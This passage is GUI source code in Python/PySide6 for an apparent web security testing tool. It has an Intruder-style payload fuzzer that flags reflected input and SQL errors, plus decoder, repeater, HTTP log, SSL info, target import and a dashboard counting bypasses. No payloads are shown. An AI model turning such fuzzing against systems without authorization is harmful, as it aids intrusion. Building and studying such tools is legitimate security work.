                        res_table.setItem(rowi, 4, _num_item(int(dt * 1000)))
                        notes = []
                        bl = istate.get('baseline')
                        if bl:
                            if st != bl[0]:
                                notes.append(f'status≠{bl[0]}')
                            if abs(ln - bl[1]) > 24:
                                notes.append('len Δ')
                        try:
                            if p and p in r.text:
                                notes.append('reflected')
                        except Exception:
                            pass
                        if SQL_ERR_RE.search(r.text or ''):
                            notes.append('SQL err')
                        ni = QTableWidgetItem(', '.join(notes))
                        if notes:
                            ni.setForeground(QBrush(QColor('#f59e0b')))
                        res_table.setItem(rowi, 5, ni)
                        body_txt = r.text if len(r.text) <= 100000 else r.text[:100000] + '\n…(truncated)'
                        hdr_txt = '\n'.join(f"{k}: {v}" for k, v in r.headers.items())
                        istate['responses'][rowi] = (f"PAYLOAD: {p}\nHTTP {st} {r.reason}  "
                                                     f"({ln} bytes, {dt*1000:.0f} ms)\n\n{hdr_txt}\n\n{body_txt}")
                    except Exception as e:
                        res_table.setItem(rowi, 2, QTableWidgetItem('ERR'))
                        res_table.setItem(rowi, 5, QTableWidgetItem(str(e)[:60]))
                        istate['responses'][rowi] = f"PAYLOAD: {p}\n{type(e).__name__}: {e}"
                istate['pending'] = still
                if not still and istate.get('baseline') is not None:
                    itimer.stop()
                    i_start.setEnabled(True); i_stop.setEnabled(False)
                    i_status.setText('Done.  (orange = differs from baseline / reflected)')

            def _intr_stop():
                itimer.stop()
                try:
                    if ipool['pool']:
                        ipool['pool'].shutdown(wait=False, cancel_futures=True)
                except Exception:
                    pass
                istate['pending'] = []
                i_start.setEnabled(True); i_stop.setEnabled(False)
                i_status.setText('Stopped.')

            def _intr_detail():
                items = res_table.selectedItems()
                if not items:
                    return
                pcell = res_table.item(items[0].row(), 1)
                rowi = pcell.data(Qt.ItemDataRole.UserRole) if pcell else None
                txt = istate['responses'].get(rowi)
                if txt:
                    i_detail.setPlainText(txt)

            itimer.timeout.connect(_intr_poll)
            load_btn.clicked.connect(_load_from_repeater)
            intr_btn.clicked.connect(lambda: (_load_from_repeater(), tabs.setCurrentWidget(intr)))
            i_start.clicked.connect(_intr_start)
            i_stop.clicked.connect(_intr_stop)
            res_table.itemSelectionChanged.connect(_intr_detail)

            # ============================ DECODER TAB ============================
            dec = QtWidgets.QWidget()
            dl = QVBoxLayout(dec)
            dl.addWidget(QLabel('INPUT'))
            dec_in = QPlainTextEdit(); dl.addWidget(dec_in)
            dec_out = QPlainTextEdit(); dec_out.setReadOnly(True)

            def _b64dec(s):
                try:
                    return _b64.b64decode(s + '=' * (-len(s) % 4)).decode('utf-8', 'replace')
                except Exception:
                    return '(invalid base64)'

            def _hexdec(s):
                try:
                    return bytes.fromhex(_re.sub(r'\s+', '', s)).decode('utf-8', 'replace')
                except Exception:
                    return '(invalid hex)'

            transforms = [
                ('URL enc', lambda s: _ulib.quote(s, safe='')),
                ('URL dec', lambda s: _ulib.unquote(s)),
                ('Base64 enc', lambda s: _b64.b64encode(s.encode('utf-8', 'replace')).decode()),
                ('Base64 dec', _b64dec),
                ('HTML enc', lambda s: _html.escape(s)),
                ('HTML dec', lambda s: _html.unescape(s)),
                ('Hex enc', lambda s: s.encode('utf-8', 'replace').hex()),
                ('Hex dec', _hexdec),
                ('\\u esc', lambda s: ''.join('\\u%04x' % ord(c) for c in s)),
            ]
            brow = QHBoxLayout()
            for label, fn in transforms:
                b = QPushButton(label)
                b.clicked.connect(lambda _=False, f=fn: dec_out.setPlainText(f(dec_in.toPlainText())))
                brow.addWidget(b)
            brow.addStretch()
            dl.addLayout(brow)
            dl.addWidget(QLabel('OUTPUT'))
            dl.addWidget(dec_out)
            tabs.addTab(dec, 'Decoder')

            def _apply_prefill(prefill):
                """Load a request (method/url/headers/body) into the Repeater tab."""
                try:
                    if not prefill:
                        return
                    method.setCurrentText(str(prefill.get('method') or 'GET').upper())
                    url.setText(_finding_url(prefill))
                    hdrs = prefill.get('headers')
                    if isinstance(hdrs, dict):
                        headers_edit.setPlainText('\n'.join(f"{k}: {v}" for k, v in hdrs.items()))
                    if prefill.get('data'):
                        body_edit.setPlainText(str(prefill.get('data')))
                    tabs.setCurrentWidget(rep)
                except Exception:
                    pass
            self._repeater_apply = _apply_prefill
            return dlg

        def _repeater_load(self, prefill):
            """Switch to the Repeater page and load a request into it."""
            self._navigate('repeater')
            fn = getattr(self, '_repeater_apply', None)
            if callable(fn):
                fn(prefill)

        def _show_http_log_dialog(self):
            """Show HTTP request/response log in a dialog."""
            if not self._http_log:
                QMessageBox.information(self, 'HTTP Log', _t('no_http_log', self._lang) if 'no_http_log' in TRANSLATIONS.get(self._lang, {}) else 'No HTTP log data available.')
                return
            
            dlg = QtWidgets.QDialog(self)
            dlg.setWindowTitle(_t('http_log_title', self._lang) if 'http_log_title' in TRANSLATIONS.get(self._lang, {}) else '📝 HTTP Request/Response Log')
            dlg.resize(1000, 700)
            dlg.setStyleSheet("""
                QDialog { background-color: #0f1112; }
                QLabel { color: #d7e1ea; }
                QTreeWidget { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; }
                QTreeWidget::item { padding: 4px; }
                QTreeWidget::item:selected { background-color: #3b82f6; }
                QTextEdit { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; }
                QPushButton { background-color: #2b2f33; color: #d7e1ea; border: none; padding: 8px 16px; border-radius: 4px; }
                QPushButton:hover { background-color: #3b3f43; }
            """)
            
            layout = QVBoxLayout(dlg)
            
            # Stats label
            stats_text = _t('http_log_stats', self._lang).format(count=len(self._http_log)) if 'http_log_stats' in TRANSLATIONS.get(self._lang, {}) else f'📊 {len(self._http_log)} HTTP transactions captured'
            stats_label = QLabel(stats_text)
            stats_label.setStyleSheet('font-size: 12px; padding: 5px;')
            layout.addWidget(stats_label)
            
            # Splitter for list and details
            splitter = QtWidgets.QSplitter(QtCore.Qt.Vertical)
            
            # Transaction list
            trans_tree = QTreeWidget()
            trans_tree.setHeaderLabels(['#', 'Time', 'Method', 'URL', 'Status', 'Size'])
            trans_tree.setColumnCount(6)
            trans_tree.setAlternatingRowColors(True)
            try:
                trans_tree.header().setSectionResizeMode(3, QHeaderView.Stretch)
            except Exception:
                pass
            
            for idx, entry in enumerate(self._http_log, 1):
                req = entry.get('request', {})
                resp = entry.get('response', {})
                error = entry.get('error')
                
                item = QTreeWidgetItem([
                    str(idx),
                    entry.get('timestamp', '')[:19],
                    req.get('method', 'N/A'),
                    req.get('url', 'N/A')[:80],
                    str(resp.get('status_code', error or 'Error')),
                    f"{resp.get('content_length', 0)} bytes" if resp else 'N/A'
                ])
                
                # Color code by status
                status = resp.get('status_code', 0) if resp else 0
                if status >= 500:
                    item.setForeground(4, QBrush(QColor('#ff6b6b')))
                elif status >= 400:
                    item.setForeground(4, QBrush(QColor('#ffa500')))
                elif status >= 300:
                    item.setForeground(4, QBrush(QColor('#ffff00')))
                elif status >= 200:
                    item.setForeground(4, QBrush(QColor('#00ff00')))
                elif error:
                    item.setForeground(4, QBrush(QColor('#ff6b6b')))
                
                item.setData(0, 256, entry)  # Store full entry in item
                trans_tree.addTopLevelItem(item)
            
            splitter.addWidget(trans_tree)
            
            # Details view
            details_edit = QTextEdit()
            details_edit.setReadOnly(True)
            details_edit.setPlaceholderText(_t('select_transaction', self._lang) if 'select_transaction' in TRANSLATIONS.get(self._lang, {}) else 'Select a transaction to view details...')
            try:
                mono_candidates = ["JetBrains Mono", "Fira Code", "Consolas", "DejaVu Sans Mono", "Courier New"]
                families = set(QFontDatabase.families()) if hasattr(QFontDatabase, 'families') else set()
                mono = next((f for f in mono_candidates if f in families), None)
                if mono:
                    details_edit.setFont(QFont(mono, 10))
            except Exception:
                pass
            splitter.addWidget(details_edit)
            
            splitter.setSizes([300, 400])
            layout.addWidget(splitter, 1)
            
            def show_transaction_details(item, col=None):
                entry = item.data(0, 256)
                if not entry:
                    return
                
                text = []
                req = entry.get('request', {})
                resp = entry.get('response', {})
                error = entry.get('error')
                
                text.append('=' * 60)
                text.append(f"📤 REQUEST")
                text.append('=' * 60)
                text.append(f"Method: {req.get('method', 'N/A')}")
                text.append(f"URL: {req.get('url', 'N/A')}")
                text.append(f"\nHeaders:")
                for k, v in req.get('headers', {}).items():
                    text.append(f"  {k}: {v[:100]}{'...' if len(v) > 100 else ''}")
                
                text.append('')
                text.append('=' * 60)
                text.append(f"📥 RESPONSE")
                text.append('=' * 60)
                
                if resp:
                    text.append(f"Status: {resp.get('status_code', 'N/A')} {resp.get('reason', '')}")
                    text.append(f"Time: {resp.get('elapsed_ms', 'N/A')} ms")
                    text.append(f"Size: {resp.get('content_length', 'N/A')} bytes")
                    text.append(f"\nHeaders:")
                    for k, v in resp.get('headers', {}).items():
                        text.append(f"  {k}: {v[:100]}{'...' if len(v) > 100 else ''}")
                    text.append(f"\nBody Preview:")
                    text.append(resp.get('body_preview', '')[:2000])
                elif error:
                    text.append(f"❌ Error: {error}")
                
                details_edit.setPlainText('\n'.join(text))
            
            trans_tree.itemClicked.connect(show_transaction_details)
            
            # Bottom buttons
            btn_layout = QHBoxLayout()
            
            export_btn = QPushButton(_t('export_http_log', self._lang) if 'export_http_log' in TRANSLATIONS.get(self._lang, {}) else '💾 Export Log')
            export_btn.clicked.connect(lambda: self._export_http_log())
            btn_layout.addWidget(export_btn)
            
            btn_layout.addStretch()
            
            close_btn = QPushButton(_t('close', self._lang))
            close_btn.clicked.connect(dlg.accept)
            btn_layout.addWidget(close_btn)
            
            layout.addLayout(btn_layout)
            dlg.exec()
        
        def _export_http_log(self):
            """Export HTTP log to JSON file."""
            if not self._http_log:
                return
            path, _ = QFileDialog.getSaveFileName(self, 'Export HTTP Log', '', 'JSON (*.json)')
            if not path:
                return
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    json.dump(self._http_log, f, indent=2)
                QMessageBox.information(self, 'Exported', f'HTTP log exported to {path}')
            except Exception as e:
                QMessageBox.critical(self, 'Export Failed', str(e))
        
        def _show_ssl_info_dialog(self):
            """Show SSL/TLS analysis information in a dialog."""
            if not self._ssl_info:
                QMessageBox.information(self, 'SSL/TLS Info', _t('no_ssl_info', self._lang) if 'no_ssl_info' in TRANSLATIONS.get(self._lang, {}) else 'No SSL/TLS analysis data available.')
                return
            
            dlg = QtWidgets.QDialog(self)
            dlg.setWindowTitle(_t('ssl_info_title', self._lang) if 'ssl_info_title' in TRANSLATIONS.get(self._lang, {}) else '🔐 SSL/TLS Certificate Analysis')
            dlg.resize(700, 600)
            dlg.setStyleSheet("""
                QDialog { background-color: #0f1112; }
                QLabel { color: #d7e1ea; }
                QGroupBox { color: #d7e1ea; border: 1px solid #2b2f33; margin-top: 10px; padding: 10px; border-radius: 5px; }
                QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px; }
                QTextEdit { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; }
                QPushButton { background-color: #2b2f33; color: #d7e1ea; border: none; padding: 8px 16px; border-radius: 4px; }
                QPushButton:hover { background-color: #3b3f43; }
            """)
            
            layout = QVBoxLayout(dlg)
            
            ssl = self._ssl_info
            
            # Connection Info
            conn_group = QtWidgets.QGroupBox(_t('connection_info', self._lang) if 'connection_info' in TRANSLATIONS.get(self._lang, {}) else '🌐 Connection Info')
            conn_layout = QVBoxLayout(conn_group)
            conn_layout.addWidget(QLabel(f"Host: {ssl.get('host', 'N/A')}:{ssl.get('port', 'N/A')}"))
            conn_layout.addWidget(QLabel(f"Protocol: {ssl.get('protocol', 'N/A')}"))
            cipher = ssl.get('cipher', {})
            conn_layout.addWidget(QLabel(f"Cipher: {cipher.get('name', 'N/A')} ({cipher.get('bits', '?')} bits)"))
            layout.addWidget(conn_group)
            
            # Certificate Info
            cert_group = QtWidgets.QGroupBox(_t('certificate_info', self._lang) if 'certificate_info' in TRANSLATIONS.get(self._lang, {}) else '📜 Certificate Info')
            cert_layout = QVBoxLayout(cert_group)
            cert = ssl.get('certificate', {})
            
            cert_info = [
                f"Subject: {cert.get('subject', 'N/A')}",
                f"Issuer: {cert.get('issuer', 'N/A')}",
                f"Serial Number: {cert.get('serial_number', 'N/A')}",
                f"Valid From: {cert.get('not_valid_before', cert.get('not_before', 'N/A'))}",
                f"Valid Until: {cert.get('not_valid_after', cert.get('not_after', 'N/A'))}",
                f"Signature Algorithm: {cert.get('signature_algorithm', 'N/A')}",
                f"Version: {cert.get('version', 'N/A')}",
                f"Public Key: {cert.get('public_key_type', 'N/A')} ({cert.get('public_key_bits', '?')} bits)"
            ]
            
            for info in cert_info:
                cert_layout.addWidget(QLabel(info))
            
            # SANs
            sans = cert.get('subject_alt_names', [])
            if sans:
                sans_label = QLabel(f"Subject Alt Names: {', '.join(sans[:5])}{'...' if len(sans) > 5 else ''}")
                sans_label.setWordWrap(True)
                cert_layout.addWidget(sans_label)
            
            layout.addWidget(cert_group)
            
            # Security Issues
            issues = ssl.get('security_issues', [])
            issues_group = QtWidgets.QGroupBox(_t('security_issues', self._lang) if 'security_issues' in TRANSLATIONS.get(self._lang, {}) else '⚠️ Security Issues')
            issues_layout = QVBoxLayout(issues_group)
            
            if issues:
                for issue in issues:
                    issue_label = QLabel(f"⚠️ {issue}")
                    issue_label.setStyleSheet('color: #ffa500;')
                    issues_layout.addWidget(issue_label)
            else:
                no_issues_label = QLabel(_t('no_security_issues', self._lang) if 'no_security_issues' in TRANSLATIONS.get(self._lang, {}) else '✅ No security issues detected')
                no_issues_label.setStyleSheet('color: #00ff00;')
                issues_layout.addWidget(no_issues_label)
            
            layout.addWidget(issues_group)
            
            # Error if any
            if ssl.get('error'):
                error_label = QLabel(f"❌ Error: {ssl.get('error')}")
                error_label.setStyleSheet('color: #ff6b6b;')
                layout.addWidget(error_label)
            
            layout.addStretch()
            
            # Bottom buttons
            btn_layout = QHBoxLayout()
            
            export_btn = QPushButton(_t('export_ssl_info', self._lang) if 'export_ssl_info' in TRANSLATIONS.get(self._lang, {}) else '💾 Export Info')
            export_btn.clicked.connect(lambda: self._export_ssl_info())
            btn_layout.addWidget(export_btn)
            
            btn_layout.addStretch()
            
            close_btn = QPushButton(_t('close', self._lang))
            close_btn.clicked.connect(dlg.accept)
            btn_layout.addWidget(close_btn)
            
            layout.addLayout(btn_layout)
            dlg.exec()
        
        def _export_ssl_info(self):
            """Export SSL/TLS info to JSON file."""
            if not self._ssl_info:
                return
            path, _ = QFileDialog.getSaveFileName(self, 'Export SSL/TLS Info', '', 'JSON (*.json)')
            if not path:
                return
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    json.dump(self._ssl_info, f, indent=2)
                QMessageBox.information(self, 'Exported', f'SSL/TLS info exported to {path}')
            except Exception as e:
                QMessageBox.critical(self, 'Export Failed', str(e))

        def show_target_details(self, item, col=None):
            target = item.data(0, 256) or item.text(0)
            tmp = self._target_tmp_map.get(target)
            per = self._per_target_results.get(target, {})
            if not tmp or not os.path.exists(tmp):
                QMessageBox.information(self, _t('no_results', self._lang), _t('no_results_for', self._lang).format(target=target))
                return
            try:
                with open(tmp, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    pretty = json.dumps(data, indent=2, ensure_ascii=False)
            except Exception:
                with open(tmp, 'r', encoding='utf-8', errors='replace') as f:
                    pretty = f.read()

            header = ''
            try:
                done_count = len(per.get('done', [])) if per.get('done') is not None else 'Unknown'
                errors = per.get('errors', [])
                header = f"{_t('done_exploits', self._lang)}: {done_count}\n{_t('errors_label', self._lang)}: {len(errors)}\n\n"
                if errors:
                    header += _t('errors_details', self._lang) + ":\n" + "\n".join(str(e) for e in errors) + "\n\n"
            except Exception:
                header = ''

            dlg = QtWidgets.QDialog(self)
            dlg.setWindowTitle(_t('results_for', self._lang).format(target=target))
            dlg.resize(800, 480)
            layout = QtWidgets.QVBoxLayout(dlg)
            te = QTextEdit()
            # try to apply a modern font to the details dialog as well
            try:
                mono_candidates = ["JetBrains Mono", "Fira Code", "Consolas", "DejaVu Sans Mono", "Courier New"]
                try:
                    families = set(QFontDatabase.families())
                except Exception:
                    try:
                        families = set(QFontDatabase().families())
                    except Exception:
                        families = set()
                mono = next((f for f in mono_candidates if f in families), None)
                if mono:
                    te.setFont(QFont(mono, 10))
            except Exception:
                pass
            te.setPlainText(header + pretty)
            te.setReadOnly(True)
            layout.addWidget(te)
            dlg.exec()

        def clean_tmp_files(self, silent: bool = False, clear_targets: bool = False):
            paths = list(self._target_tmp_map.values()) + list(self._tmp_result_paths)
            unique = []
            for p in paths:
                if not p or p in unique:
                    continue
                if os.path.exists(p):
                    unique.append(p)
            if not unique:
                if not silent:
                    QMessageBox.information(self, _t('clear', self._lang), _t('no_tmp_files', self._lang))
                # still clear targets/logs if requested
                if clear_targets:
                    try:
                        for i in range(self.tree.topLevelItemCount()-1, -1, -1):
                            try:
                                self.tree.takeTopLevelItem(i)
                            except Exception:
                                pass
                    except Exception:
                        pass
                    try:
                        self.log.clear()
                    except Exception:
                        try:
                            self.log.setPlainText('')
                        except Exception:
                            pass
                    self._results = []
                    self._tmp_result_paths = []
                    self._target_tmp_map = {}
                    self._per_target_results = {}
                    try:
                        self.save_btn.setEnabled(False)
                        self.results_btn.setEnabled(False)
                        self._stop_results_pulse()
                        self.results_btn.setStyleSheet(self._results_btn_base_style)
                    except Exception:
                        pass
                try:
                    self._update_legend_counts()
                except Exception:
                    pass
                return
            if not silent:
                if QMessageBox.question(self, _t('clear', self._lang), _t('remove_files_confirm', self._lang).format(count=len(unique))) != QMessageBox.Yes:
                    return
            removed = 0
            for p in unique:
                try:
                    os.remove(p)
                    removed += 1
                except Exception:
                    pass
            # cleanup mapping
            for t, p in list(self._target_tmp_map.items()):
                if not os.path.exists(p):
                    self._target_tmp_map.pop(t, None)
            self._tmp_result_paths = [p for p in self._tmp_result_paths if os.path.exists(p)]
            if not silent:
                QMessageBox.information(self, _t('clear', self._lang), _t('removed_files', self._lang).format(count=removed))
            # If requested also clear targets and outputs
            if clear_targets:
                try:
                    for i in range(self.tree.topLevelItemCount()-1, -1, -1):
                        try:
                            self.tree.takeTopLevelItem(i)
                        except Exception:
                            pass
                except Exception:
                    pass
                try:
                    self.log.clear()
                except Exception:
                    try:
                        self.log.setPlainText('')
                    except Exception:
                        pass
                self._results = []
                self._tmp_result_paths = []
                self._target_tmp_map = {}
                self._per_target_results = {}
                try:
                    self.save_btn.setEnabled(False)
                    self.results_btn.setEnabled(False)
                    self._stop_results_pulse()
                    self.results_btn.setStyleSheet(self._results_btn_base_style)
                except Exception:
                    pass
            try:
                self._update_legend_counts()
            except Exception:
                pass

        # ==================== IMPORT TARGETS ====================
        def _import_targets_dialog(self):
            """Show dialog to import targets from file."""
            try:
                path, _ = QFileDialog.getOpenFileName(
                    self,
                    _t('import_from_file', self._lang) if 'import_from_file' in TRANSLATIONS.get(self._lang, {}) else 'Import Targets',
                    filter='All Files (*.txt *.csv *.json *.xml);;Text Files (*.txt);;CSV Files (*.csv);;JSON Files (*.json);;Burp XML (*.xml)'
                )
                if not path:
                    return
                
                targets = []
                ext = os.path.splitext(path)[1].lower()
                
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                if ext == '.json':
                    # JSON format
                    try:
                        data = json.loads(content)
                        if isinstance(data, list):
                            for item in data:
                                if isinstance(item, str):
                                    targets.append(item.strip())
                                elif isinstance(item, dict):
                                    # Try common fields
                                    for key in ['url', 'target', 'host', 'domain']:
                                        if key in item:
                                            targets.append(str(item[key]).strip())
                                            break
                        elif isinstance(data, dict):
                            for key in ['urls', 'targets', 'hosts', 'domains']:
                                if key in data and isinstance(data[key], list):
                                    targets.extend([str(t).strip() for t in data[key]])
                                    break
                    except json.JSONDecodeError:
                        pass
                elif ext == '.csv':
                    # CSV format
                    import csv
                    try:
                        reader = csv.reader(content.splitlines())
                        for row in reader:
                            if row:
                                # First column or URL column
                                val = row[0].strip()
                                if val and not val.lower().startswith(('url', 'target', 'host', '#')):
                                    targets.append(val)
                    except Exception:
                        # Fallback to line-by-line
                        targets = [line.strip() for line in content.splitlines() if line.strip() and not line.startswith('#')]
                elif ext == '.xml':
                    # Burp Suite XML export
                    try:
                        import xml.etree.ElementTree as ET
                        root = ET.fromstring(content)
                        # Look for Burp's host/url elements
                        for item in root.findall('.//item'):
                            host = item.find('host')
                            protocol = item.find('protocol')
                            if host is not None and host.text:
                                url = f"{protocol.text if protocol is not None else 'https'}://{host.text}"
                                if url not in targets:
                                    targets.append(url)
                        # Also try standard URL elements
                        for url in root.findall('.//url'):
                            if url.text:
                                targets.append(url.text.strip())
                    except Exception:
                        pass
                else:
                    # Plain text - one URL per line
                    targets = [line.strip() for line in content.splitlines() if line.strip() and not line.startswith('#')]
                
                # Add targets to the tree
                existing = [self.tree.topLevelItem(i).data(0, 256) or self.tree.topLevelItem(i).text(0) for i in range(self.tree.topLevelItemCount())]
                added = 0
                for target in targets:
                    if target and target not in existing:
                        display_text = self._censor(target)
                        it = QTreeWidgetItem([display_text, 'Queued', ''])
                        it.setData(0, 256, target)  # Store actual URL in UserRole
                        self.tree.addTopLevelItem(it)
                        self._create_progress_bar_for_item(it, target)
                        existing.append(target)
                        added += 1
                
                if added > 0:
                    self._update_legend_counts()
                    QMessageBox.information(
                        self,
                        _t('imported_targets', self._lang).format(count=added) if 'imported_targets' in TRANSLATIONS.get(self._lang, {}) else f'Imported {added} targets',
                        _t('imported_targets', self._lang).format(count=added) if 'imported_targets' in TRANSLATIONS.get(self._lang, {}) else f'Imported {added} targets'
                    )
            except Exception as e:
                QMessageBox.critical(self, 'Import Error', str(e))

        def _import_scan_json_dialog(self):
            """Import saved scan results from JSON and merge into current session results."""
            try:
                path, _ = QFileDialog.getOpenFileName(
                    self,
                    'Import Scan JSON',
                    filter='JSON Files (*.json);;All Files (*.*)'
                )
                if not path:
                    return

                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    raw = json.load(f)

                records = []
                default_target = 'Imported JSON'

                if isinstance(raw, list):
                    records = raw
                elif isinstance(raw, dict):
                    for key in ('results', 'findings', 'data', 'items'):
                        if isinstance(raw.get(key), list):
                            records = raw.get(key)
                            break
                    if not records and any(k in raw for k in ('technique', 'severity', 'bypass', 'reason')):
                        records = [raw]
                    default_target = str(raw.get('target') or raw.get('url') or default_target)

                imported = []
                for item in records:
                    if not isinstance(item, dict):
                        continue
                    rec = dict(item)
                    target = rec.get('target') or rec.get('url') or default_target
                    rec['target'] = str(target)
                    imported.append(rec)

                if not imported:
                    QMessageBox.information(self, 'Import JSON', 'No scan results found in this JSON file.')
                    return

                self._results.extend(imported)

                by_target = {}
                for r in imported:
                    t = r.get('target', default_target)
                    by_target.setdefault(t, []).append(r)

                # Build existing target map from actual URLs in UserRole
                existing_items = {}
                for i in range(self.tree.topLevelItemCount()):
                    item = self.tree.topLevelItem(i)
                    actual = item.data(0, 256) or item.text(0)
                    existing_items[actual] = item

                for target, rows in by_target.items():
                    prior = self._per_target_results.get(target, {'done': [], 'errors': [], 'tmp': None})
                    prior_done = list(prior.get('done', []))
                    prior_done.extend(rows)
                    self._per_target_results[target] = {
                        'done': prior_done,
                        'errors': list(prior.get('errors', [])),
                        'tmp': prior.get('tmp')
                    }

                    item = existing_items.get(target)
                    if item is None:
                        display_text = self._censor(target)
                        item = QTreeWidgetItem([display_text, f'Done ({len(prior_done)})', ''])
                        item.setData(0, 256, target)
                        self.tree.addTopLevelItem(item)
                        self._create_progress_bar_for_item(item, target)
                        existing_items[target] = item
                    else:
                        item.setText(1, f'Done ({len(prior_done)})')

                    try:
                        item.setBackground(0, QBrush(QColor('#163f19')))
                    except Exception:
                        pass
                    try:
                        if target in self._progress_bars:
                            self._progress_bars[target].setValue(100)
                    except Exception:
                        pass

                try:
                    self.save_btn.setEnabled(True)
                    self.results_btn.setEnabled(True)
                    self.results_btn.setStyleSheet(self._results_btn_green_style)
                    self._start_results_pulse()
                    self._update_legend_counts()
                except Exception:
                    pass

                self.append_log(f"[+] Imported {len(imported)} scan result(s) from JSON\n")
                QMessageBox.information(self, 'Import JSON', f'Imported {len(imported)} scan result(s).')
            except Exception as e:
                QMessageBox.critical(self, 'Import Error', str(e))

        # ==================== DASHBOARD ====================
        def _build_dashboard_page(self):
            """Statistics dashboard as an in-place page (rebuilt fresh per visit)."""
            from PySide6.QtCore import Qt

            try:
                if self._db:
                    stats = self._db.get_dashboard_stats()
                else:
                    stats = {'total_scans': 0, 'total_findings': 0, 'total_bypasses': 0, 'severity_distribution': {}, 'top_techniques': []}

                page = QtWidgets.QWidget()
                page.setObjectName('DashboardPage')
                layout = QVBoxLayout(page)
                layout.setContentsMargins(22, 20, 22, 20)
                layout.setSpacing(14)

                header_row = QHBoxLayout()
                title_box = QVBoxLayout()
                title = QLabel('Dashboard')
                title.setObjectName('PageTitle')
                subtitle = QLabel('Scan history, finding mix, and workflow pressure.')
                subtitle.setObjectName('FieldLabel')
                title_box.addWidget(title)
                title_box.addWidget(subtitle)
                header_row.addLayout(title_box)
                header_row.addStretch()
                compare_btn = QPushButton('Compare Scans')
                compare_btn.clicked.connect(lambda: self._show_compare_scans_dialog())
                header_row.addWidget(compare_btn)
                layout.addLayout(header_row)

                metrics = QtWidgets.QFrame()
                metrics.setObjectName('Card')
                metrics_layout = QtWidgets.QGridLayout(metrics)
                metrics_layout.setContentsMargins(14, 12, 14, 12)
                metrics_layout.setHorizontalSpacing(18)
                metric_values = [
                    ('Scans', stats.get('total_scans', 0)),
                    ('Findings', stats.get('total_findings', 0)),
                    ('Bypasses', stats.get('total_bypasses', 0)),
                    ('Targets', len(stats.get('top_targets', []) or [])),
                ]
                for col, (label, value) in enumerate(metric_values):
                    val = QLabel(str(value))
                    val.setFont(QFont('', 22, QFont.Bold))
                    name = QLabel(label)
                    name.setObjectName('FieldLabel')
                    val.setAlignment(Qt.AlignmentFlag.AlignCenter)
                    name.setAlignment(Qt.AlignmentFlag.AlignCenter)
                    metrics_layout.addWidget(val, 0, col)
                    metrics_layout.addWidget(name, 1, col)
                    metrics_layout.setColumnStretch(col, 1)
                layout.addWidget(metrics)

                sev_dist = stats.get('severity_distribution', {})
                sev_colors = {'CRITICAL': '#dc2626', 'HIGH': '#ea580c', 'MEDIUM': '#ca8a04', 'LOW': '#2563eb', 'INFO': '#6b7280'}
                severity_frame = QtWidgets.QFrame()
                severity_frame.setObjectName('Card')
                severity_layout = QHBoxLayout(severity_frame)
                severity_layout.setContentsMargins(12, 10, 12, 10)
                severity_layout.setSpacing(8)
                for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
                    item = QtWidgets.QFrame()
                    item.setObjectName('DashboardPill')
                    item_layout = QHBoxLayout(item)
                    item_layout.setContentsMargins(10, 6, 10, 6)
                    dot = QLabel('■')
                    dot.setStyleSheet(f'color: {sev_colors.get(sev, "#d7e1ea")};')
                    txt = QLabel(f'{sev.title()} {sev_dist.get(sev, 0)}')
                    item_layout.addWidget(dot)
                    item_layout.addWidget(txt)
                    item_layout.addStretch()
                    severity_layout.addWidget(item)
                layout.addWidget(severity_frame)

                tables = QtWidgets.QSplitter()
                tables.setOrientation(Qt.Orientation.Horizontal)
                layout.addWidget(tables, 1)

                tech_box = QtWidgets.QWidget()
                tech_layout = QVBoxLayout(tech_box)
                tech_layout.setContentsMargins(0, 0, 8, 0)
                tech_title = QLabel('Top Techniques')
                tech_title.setObjectName('FieldLabel')
                tech_layout.addWidget(tech_title)
                tech_table = QtWidgets.QTableWidget(0, 2)
                tech_table.setHorizontalHeaderLabels(['Technique', 'Count'])
                tech_table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
                tech_table.setEditTriggers(QtWidgets.QAbstractItemView.EditTrigger.NoEditTriggers)
                try:
                    tech_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
                    tech_table.setColumnWidth(1, 80)
                except Exception:
                    pass
                for t in (stats.get('top_techniques', []) or [])[:10]:
                    r = tech_table.rowCount()
                    tech_table.insertRow(r)
                    tech_table.setItem(r, 0, QtWidgets.QTableWidgetItem(str(t.get('technique', 'Unknown'))))
                    tech_table.setItem(r, 1, QtWidgets.QTableWidgetItem(str(t.get('count', 0))))
                tech_layout.addWidget(tech_table)
                tables.addWidget(tech_box)

                activity_box = QtWidgets.QWidget()
                activity_layout = QVBoxLayout(activity_box)
                activity_layout.setContentsMargins(8, 0, 0, 0)
                activity_title = QLabel('Recent Activity')
                activity_title.setObjectName('FieldLabel')
                activity_layout.addWidget(activity_title)
                activity_table = QtWidgets.QTableWidget(0, 4)
                activity_table.setHorizontalHeaderLabels(['Date', 'Scans', 'Findings', 'Bypasses'])
                activity_table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
                activity_table.setEditTriggers(QtWidgets.QAbstractItemView.EditTrigger.NoEditTriggers)
                try:
                    activity_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
                except Exception:
                    pass
                for item in (stats.get('recent_activity', []) or [])[:14]:
                    r = activity_table.rowCount()
                    activity_table.insertRow(r)
                    activity_table.setItem(r, 0, QtWidgets.QTableWidgetItem(str(item.get('date', ''))))
                    activity_table.setItem(r, 1, QtWidgets.QTableWidgetItem(str(item.get('scans', 0))))
                    activity_table.setItem(r, 2, QtWidgets.QTableWidgetItem(str(item.get('findings', 0))))
                    activity_table.setItem(r, 3, QtWidgets.QTableWidgetItem(str(item.get('bypasses', 0))))
                activity_layout.addWidget(activity_table)
                tables.addWidget(activity_box)
                tables.setSizes([520, 520])

                if not (stats.get('top_techniques') or stats.get('recent_activity')):
                    empty = QLabel('No scan history yet.')
                    empty.setObjectName('FieldLabel')
                    layout.addWidget(empty)

                return page
            except Exception as e:
                QMessageBox.critical(self, 'Dashboard Error', str(e))
                return None

